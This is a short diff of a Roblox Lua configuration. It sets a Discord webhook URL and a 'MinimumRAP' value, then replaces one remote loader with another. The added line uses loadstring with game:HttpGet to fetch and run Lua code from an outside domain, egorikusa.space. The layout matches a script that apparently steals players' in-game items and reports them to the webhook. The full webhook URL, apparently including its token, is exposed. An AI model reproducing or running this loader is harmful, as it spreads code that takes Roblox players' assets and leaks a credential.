@@ -3,4 +3,4 @@ Webhook= 'https://discord.com/api/webhooks/1279165457542152232/kdC6iIlU6swp1PUzX
 
 MinimumRAP = 1
 
-loadstring(game:HttpGet('https://arkhalis.space/adoptme.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/9d0da1c0b7e630f309f1ac71.lua", true))()
